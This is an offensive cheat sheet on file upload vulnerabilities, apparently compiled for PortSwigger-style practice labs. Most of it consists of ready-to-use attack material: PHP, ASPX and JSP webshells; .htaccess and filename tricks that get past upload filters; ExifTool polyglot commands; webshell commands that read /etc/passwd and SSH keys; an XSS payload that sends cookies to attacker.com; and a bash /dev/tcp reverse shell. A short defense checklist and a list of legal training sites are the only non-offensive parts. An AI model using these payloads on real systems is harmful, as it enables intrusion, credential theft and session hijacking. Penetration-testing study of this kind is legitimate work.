# File Upload Vulnerabilities — Cheat Sheet

---

## Quick Attack Decision Tree

```
Can you upload .php directly?
├── YES → Upload webshell, access at /files/avatars/shell.php?cmd=id
└── NO → Is it blocked by Content-Type or extension?
    ├── Content-Type only → Change Content-Type to image/jpeg in Burp
    ├── Extension blacklist → Try alternative extensions or .htaccess
    ├── Extension whitelist → Try polyglot file or double extension
    └── Magic byte check → Use ExifTool polyglot file
```

---

## Lab Techniques Quick Reference

| Lab | Technique | Key Action |
|---|---|---|
| Content-Type restriction bypass | Change Content-Type header | Set to `image/jpeg` in Burp |
| Extension blacklist bypass | Upload `.htaccess` | Then upload shell with custom extension |
| Path traversal | Escape uploads folder | Use `..%2f` in filename |
| Null byte bypass | Terminate string early | Use `shell.php%00.jpg` |
| Race condition | Send requests in parallel | Group POST + GET in Burp Repeater, send parallel |

---

## Common Webshell Payloads

| Goal | Payload |
|---|---|
| Read specific file | `<?php echo file_get_contents('/home/carlos/secret'); ?>` |
| Run any command | `<?php echo system($_GET['cmd']); ?>` |
| Read file clean | `<?php echo trim(file_get_contents('/home/carlos/secret')); ?>` |

---

## Alternative PHP Extensions

When `.php` is blacklisted try:
```
.php3   .php4   .php5   .php7
.phtml  .phar   .phps   .pht
```

---

## Filename Obfuscation Techniques

| Technique | Example |
|---|---|
| Case change | `shell.PHP` `shell.Php` `shell.pHp` |
| Double extension | `shell.php.jpg` `shell.jpg.php` |
| Trailing dot | `shell.php.` |
| Trailing space | `shell.php%20` |
| Null byte | `shell.php%00.jpg` |
| URL encoded dot | `shell%2Ephp` |
| Semicolon | `shell.php;.jpg` |
| Nested extension | `shell.p.phphp` |
| URL encoded slash | `..%2fshell.php` |
| Double URL encoded | `..%252fshell.php` |

---

## Magic Bytes Reference

| File Type | Hex | ASCII |
|---|---|---|
| JPEG | FF D8 FF | ÿØÿ |
| PNG | 89 50 4E 47 | ‰PNG |
| GIF | 47 49 46 38 | GIF8 |
| PDF | 25 50 44 46 | %PDF |
| ZIP | 50 4B 03 04 | PK |
| EXE | 4D 5A | MZ |
| Bash | 23 21 | #! |
| PHP | None | — |
| Python | None | — |

---

## .htaccess Payloads

| Goal | Payload |
|---|---|
| Execute .shell as PHP | `AddType application/x-httpd-php .shell` |
| Execute .l33t as PHP | `AddType application/x-httpd-php .l33t` |
| Execute .png as PHP | `AddType application/x-httpd-php .png` |

---

## ExifTool Quick Reference

| Action | Command |
|---|---|
| Check version | `exiftool -ver` |
| Read metadata | `exiftool file.png` |
| Inject file read payload | `exiftool -comment="<?php echo file_get_contents('/home/carlos/secret'); ?>" input.png -o shell.php` |
| Inject command execution payload | `exiftool -comment="<?php echo system($_GET['cmd']); ?>" input.png -o shell.php` |

---

## Webshell URL Commands Quick Reference

| Goal | URL |
|---|---|
| Check server user | `?cmd=id` |
| Check hostname | `?cmd=whoami` |
| List home directories | `?cmd=ls /home/` |
| Read secret | `?cmd=cat /home/carlos/secret` |
| Read passwd file | `?cmd=cat /etc/passwd` |
| List web root | `?cmd=ls /var/www/html/` |
| Copy shell | `?cmd=cp shell.php /var/www/html/backdoor.php` |

---

## Target Files by OS

| OS | File | Contains |
|---|---|---|
| Linux | `/etc/passwd` | All system users |
| Linux | `/home/carlos/secret` | Lab secret |
| Linux | `/var/www/html/config.php` | DB credentials |
| Linux | `~/.ssh/id_rsa` | SSH private key |
| Windows | `C:/Windows/win.ini` | Basic config |
| Windows | `C:/boot.ini` | Boot config |
| Windows | `C:/Users/user/.ssh/id_rsa` | SSH key |

---

## Burp Suite Quick Reference

| Action | How |
|---|---|
| Intercept request | Proxy → Intercept → Intercept is ON |
| Send to Repeater | Right click request → Send to Repeater |
| Send to Intruder | Right click request → Send to Intruder |
| Group requests | Click + in Repeater to add tab to group |
| Send in parallel | Dropdown next to Send → Send group in parallel |
| Find image requests | Proxy → HTTP History → Filter → uncheck Images |
| Change HTTP version | Right click in Repeater → Change request version |

---

## Server Technology Identification

| Clue | Technology |
|---|---|
| `.php` in URLs | PHP |
| `.asp` `.aspx` in URLs | ASP.NET (Windows) |
| `.jsp` in URLs | Java/Tomcat |
| `.py` in URLs | Python |
| `X-Powered-By: PHP` header | PHP + version |
| Apache in Server header | Apache web server |
| IIS in Server header | Windows IIS |
| Nginx in Server header | Nginx |
| Wappalyzer extension | Shows everything automatically |

---

## Webshell by Server Type

| Server | Language | Webshell |
|---|---|---|
| Apache Linux | PHP | `<?php system($_GET['cmd']); ?>` |
| IIS Windows | ASPX | `<% eval request("cmd") %>` |
| Tomcat | JSP | `Runtime.getRuntime().exec(cmd)` |
| Flask/Django | Python | `import os; os.system(cmd)` |

---

## Race Condition Attack Flow

```
1. Upload malicious shell.php (POST request)
2. Immediately execute shell.php (GET request)
3. Send both in parallel using Burp Repeater
4. File exists briefly → GET hits during that window
5. Shell executes before server deletes it
```

---

## Defense Checklist (for developers)

| Check | Implementation |
|---|---|
| Whitelist extensions | Only allow .jpg .png .gif |
| Check magic bytes | Verify actual file contents |
| Check MIME type | Validate Content-Type |
| Randomize filename | Use random name on save |
| Store outside web root | Save to non-public folder |
| Never execute uploads | Serve as static only |
| Strip metadata | Remove EXIF data |
| Set size limits | Prevent DoS |
| Use frameworks | Laravel, Django, ASP.NET Core |

---

## Cookie Stealing via XSS

### Payload:
```javascript
document.location='http://attacker.com/steal?cookie='+document.cookie
```

### Embed in SVG upload:
```svg
<svg xmlns="http://www.w3.org/2000/svg">
  <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
</svg>
```

---

## Reverse Shell Quick Reference

| Step | Command |
|---|---|
| Start listener | `nc -lvnp 4444` |
| Execute on server | `bash -i >& /dev/tcp/YOUR-IP/4444 0>&1` |
| Via webshell | `?cmd=bash -i >& /dev/tcp/YOUR-IP/4444 0>&1` |

---

## Practice Labs (Legal Only)

| Platform | URL | Level |
|---|---|---|
| PortSwigger Web Academy | portswigger.net/web-security/file-upload | Beginner → Advanced |
| TryHackMe | tryhackme.com | Beginner friendly |
| HackTheBox | hackthebox.com | Intermediate → Advanced |
